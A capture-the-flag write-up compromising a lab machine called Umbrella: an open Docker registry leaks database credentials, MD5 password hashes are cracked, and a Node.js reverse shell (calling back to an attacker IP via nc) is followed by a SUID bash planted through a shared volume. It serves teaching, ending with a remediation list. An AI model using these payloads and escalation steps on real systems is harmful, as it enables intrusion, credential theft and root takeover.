## Umbrella

Medium-difficulty Linux machine. A publicly readable Docker registry leaked database credentials, which gave access to a user account. That user could reach a Node.js web app that ran code as root inside a container. A writable shared directory then carried a root-owned SUID shell back to the host.

**Target:** 10.48.134.110 (umbrella)
**Difficulty:** Medium
**Attack Path:** Port scan → Docker registry → Leaked DB password → MD5 cracking → SSH as claire-r → Node.js code execution (root in container) → SUID bash via shared volume → root on host

---

### PART 1: RECONNAISSANCE

**Why start with a port scan?** Every attack begins with knowing what is listening. Each open port is a possible way in, so we map them all before choosing one.

**Full port scan**

```
nmap -p- 10.48.134.110
```

```
22/tcp    open   ssh         OpenSSH 8.2p1 Ubuntu
3306/tcp  open   mysql       MySQL 5.7.40
5000/tcp  open   upnp        Docker Registry (API v2.0)
8080/tcp  open   http-proxy  Node.js (Express), login page
```

**Service and version scan**

```
nmap -sV -sC -p 22,3306,5000,8080 10.48.134.110
```

This confirms four services:
- **SSH** on 22: a remote login service. Useful once we have valid credentials.
- **MySQL** on 3306: a database. Exposed to the network, which is unusual and worth noting.
- **Docker Registry** on 5000: a server that stores container images. Port 5000 is commonly left open with no authentication.
- **Node.js web app** on 8080: a login page built with Express.

**Takeaway:** There are two web-facing services. The registry is the more promising one, because it is rarely protected by default.

---

### PART 2: DOCKER REGISTRY EXPOSURE

**What is a Docker registry?** A place where container images are stored and downloaded, similar to a library for software packages. Each image is organized into repositories, and each repository has tagged versions.

**Step 1: List repositories**

```
curl -i http://10.48.134.110:5000/v2/_catalog
```

Response:

```json
{"repositories":["umbrella/timetracking"]}
```

The catalog endpoint should require authentication. Here it returns the full list without credentials. This is the first finding.

**Step 2: Read the image manifest**

A manifest describes an image: its layers, configuration, and environment variables.

```
curl -i http://10.48.134.110:5000/v2/umbrella/timetracking/manifests/latest
```

The manifest includes the container's environment configuration, which contains:

```
DB_HOST=db
DB_USER=root
DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5
DB_DATABASE=timetracking
```

**Why this matters:** Developers often bake secrets into container environment variables. Anyone who can read the image can read those secrets.

**Finding:** Database credentials are exposed to anyone who can reach port 5000.

---

### PART 3: DATABASE ACCESS

**Step 1: Connect to MySQL**

```
mysql -h 10.48.134.110 -u root -p
```

Password: `Ng1-f3!Pe7-e5?Nf3xe5`

**Step 2: Enumerate databases**

```sql
SHOW DATABASES;
```

```
information_schema
mysql
performance_schema
sys
timetracking
```

The `timetracking` database matches the container name and the `DB_DATABASE` value from the manifest.

**Step 3: Read the users table**

```sql
USE timetracking;
SELECT * FROM users;
```

```
user       pass                               time
claire-r   2ac9cb7dc02b3c0083eb70898e549b63   360
chris-r    0d107d09f5bbe40cade3de5c71e9e9b7   420
jill-v     d5c0607301ad5d5c1528962a83992ac8   564
barry-b    4a04890400b5d7bac101baace5d7e994   47893
```

**Why these hashes are weak:** Each `pass` value is 32 hexadecimal characters. That length matches an MD5 hash. MD5 is fast to compute, so common passwords can be checked very quickly against precomputed lists.

---

### PART 4: CRACKING THE HASHES

Four MD5 hashes were looked up in an online cracking database. Each hash maps to a common password:

```
claire-r   2ac9cb7dc02b3c0083eb70898e549b63   Password1
chris-r    0d107d09f5bbe40cade3de5c71e9e9b7   letmein
jill-v     d5c0607301ad5d5c1528962a83992ac8   sunshine1
barry-b    4a04890400b5d7bac101baace5d7e994   sandwich
```

Offline tools such as hashcat or John the Ripper with rockyou.txt would find the same results:

```
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Takeaway:** Unsalted MD5 with weak passwords is effectively plaintext. Each of these passwords is in common wordlists.

---

### PART 5: INITIAL ACCESS (SSH)

The web login and SSH both accept these user accounts. Testing each username against SSH identified a valid login:

```
ssh claire-r@10.48.134.110
Password: Password1
```

Login succeeds. Files in the home directory:

```
timeTracker-src/
user.txt
```

The user flag is in `user.txt`. Its value is not recorded in the notes for this writeup:

```
cat user.txt
[user flag: not recorded in notes]
```

**Takeaway:** Credentials gathered from one service (the registry) were reused on another (SSH). The leak in Part 2 gave us everything needed, without any exploit.

---

### PART 6: CODE EXECUTION IN THE NODE.JS APP

**What we know:** The `timeTracker-src` directory belongs to the Node.js application on port 8080. Port 8080 runs Express middleware, and the web session belongs to claire-r.

**What the notes show:** A Node.js reverse shell payload was entered into the logged-in claire-r session of the web application. The notes don't name the exact field or feature the payload went through, so this writeup describes the step generally. The key point is that the app evaluated user-supplied JavaScript on the server.

**Payload (reverse shell):**

```javascript
(function(){
    var net = require("net"),
        cp  = require("child_process"),
        sh  = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(12345, "192.168.136.69", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

**What this does, line by line:**
1. Loads Node's networking (`net`) and process-spawning (`child_process`) modules.
2. Starts `/bin/sh` as a child process.
3. Opens a TCP connection back to the attacker at port 12345.
4. Connects the shell's input and output to that connection, so commands typed on the attacker side run on the target.

**Listener on the attacker machine:**

```
nc -lvnp 12345
```

Connection received:

```
connect to [192.168.136.69] from (UNKNOWN) [10.48.134.110] 58818
```

**Shell stabilization:**

```
perl -e 'use POSIX; POSIX::setsid(); exec "/bin/sh";'
```

Checking identity:

```
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

**Important:** This is root inside the Node.js container, not on the host. Container root is limited compared to real host root, but the shell is powerful enough to change files on any volume the container shares with the host. Part 7 uses that.

---

### PART 7: CROSSING INTO THE HOST

**The idea:** The timetracker logs directory is shared between the container and the host. A file written as root in the container can be used by claire-r on the host. If that file is a copy of bash with the SUID bit set, running it gives claire-r a root-effective shell.

**Background: the SUID bit.** Normally a program runs with the permissions of the user who starts it. A file with the SUID bit set runs with the permissions of its owner instead. If the owner is root, the program runs as root for anyone who executes it.

**Step 1: Copy bash into the shared directory (as container root)**

```
cp /bin/bash /logs
chmod 4777 /logs/bash
```

- `cp` copies the bash binary.
- `chmod 4777` sets the SUID bit (the leading 4) and gives everyone read, write, and execute permission.

**Step 2: Switch back to claire-r on the host**

```
ssh claire-r@10.48.134.110
cd /timetracker/logs
ls
bash  tt.log
```

The `bash` file copied from the container appears here.

**Step 3: Run it with privileges preserved**

```
./bash -p
```

The `-p` flag tells bash not to drop elevated privileges. Without it, bash resets its effective UID to the real user.

Output:

```
bash-5.1# whoami
root
```

**Step 4: Read the root flag**

```
cat /root/root.txt
[root flag: not recorded in notes]
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Full port scan
  ├─ Service and version detection
  └─ Identify registry on port 5000

PHASE 2: Registry Exposure
  ├─ Unauthenticated catalog: umbrella/timetracking
  ├─ Read manifest: latest
  └─ Recover DB credentials from environment variables

PHASE 3: Database Access
  ├─ Connect to MySQL as root
  ├─ Read timetracking.users
  └─ Four MD5 password hashes

PHASE 4: Hash Cracking
  └─ Crack claire-r: Password1

PHASE 5: Initial Access
  ├─ SSH as claire-r
  └─ User flag

PHASE 6: Container Root
  ├─ Node.js reverse shell via web app session
  └─ Root inside container

PHASE 7: Host Root
  ├─ Copy bash to shared /logs directory
  ├─ Set SUID bit
  └─ Run ./bash -p as claire-r → root on host
```

---

### VULNERABILITIES

1. **Unauthenticated Docker Registry (High)**
   - Catalog and manifests readable without credentials
   - Exposes application internals and secrets

2. **Secrets in Image Environment Variables (Critical)**
   - Database root password stored in plaintext in the manifest
   - Password reused across services

3. **Weak Unsalted MD5 Password Hashes (High)**
   - Hashes stored as MD5 with no salt
   - Common passwords cracked in seconds

4. **Password Reuse (Medium)**
   - Database and user passwords overlap with SSH access

5. **Server-Side Code Execution via Web App (Critical)**
   - Authenticated users can run JavaScript on the server
   - Reverse shell obtained as root inside the container

6. **Shared Volume Privilege Escalation (Critical)**
   - Container root can write SUID binaries into a directory the host uses
   - Any local user can then obtain root

7. **Root Database Account Exposed Remotely (High)**
   - MySQL reachable from the network with root privileges

---

### REMEDIATION

```
├─ Require authentication on the Docker registry; restrict network access
├─ Never store secrets in image environment variables; use a secrets manager
├─ Replace MD5 with bcrypt, scrypt, or Argon2 with per-user salts
├─ Enforce strong, unique passwords and avoid reuse across services
├─ Remove code evaluation from the web application; validate all input
├─ Run containers as a non-root user and drop unnecessary capabilities
├─ Do not mount host-accessible directories writable by container root
├─ Bind MySQL to localhost or a private network; disable remote root login
└─ Monitor for new SUID files and unexpected binaries in shared paths
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- curl (Docker Registry API requests)
- mysql client (database access)
- Online MD5 lookup or hashcat/John the Ripper (hash cracking)
- ssh (initial access)
- nc (reverse shell listener)
- Perl one-liner (shell stabilization)

**Key Insight:** The registry leaked a database password. That password, the weak MD5 hashes it unlocked, and a web app that executed code all led to a container root shell. A shared directory then let that shell hand root back to the host.

**Concepts to Study:**
- Docker registry API and image manifests
- Unsalted hashing vs. modern password hashing
- Reverse shells and listeners
- SUID bit and why `bash -p` matters
- Container isolation and volume mounts

# JAI SHRI RAM
